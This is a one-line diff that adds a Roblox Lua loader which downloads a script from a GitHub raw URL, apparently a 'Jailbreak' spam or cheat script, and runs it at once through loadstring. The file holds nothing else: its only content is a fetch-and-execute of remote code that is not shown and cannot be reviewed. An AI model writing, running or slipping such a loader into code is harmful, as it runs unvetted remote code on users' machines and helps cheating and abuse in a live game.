@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/jailbreak-spam2-gfgn2zuio3yuxm.lua"))()
